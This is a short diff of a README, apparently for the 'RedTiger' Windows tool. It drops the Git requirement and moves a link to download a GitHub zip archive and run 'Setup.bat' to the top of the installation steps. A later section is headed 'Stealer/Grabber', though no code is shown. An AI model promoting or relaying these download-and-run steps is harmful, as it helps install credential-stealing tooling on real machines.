@@ -54,11 +54,12 @@
 <h2>🔒・Requirements:</h2>
 <p>
 - You need to <a href="https://www.python.org/downloads/">install Python</a> with the <strong>PATH</strong> option. <a href="https://www.python.org/downloads/">Download Here</a><br>
-- You need to <a href="https://git-scm.com/download/win">install GIT</a> with the <strong>PATH</strong> option. <a href="https://git-scm.com/download/win">Download Here</a><br>
 - Windows 10/11
 </p>
 <h2>⏳・Installation:</h2>
 <p>
+Install the RedTiger tool <a href="https://github.com/fluzyteck/RedTiger/archive/main.zip
+">Here</a> and launch "Setup.bat".
 
 ```
 Install with Git:
@@ -74,8 +75,6 @@ Install with GitHub:
   3) Extract the file "RedTiger-main.zip" to your desktop,
   4) Launch "Setup.bat".
 ```
-Or install the Red Tiger tool <a href="https://github.com/fluzyteck/RedTiger/archive/main.zip
-">Here</a> and launch "Setup.bat".
 </p>
 
 <h2>💀・Stealer/Grabber:</h2>
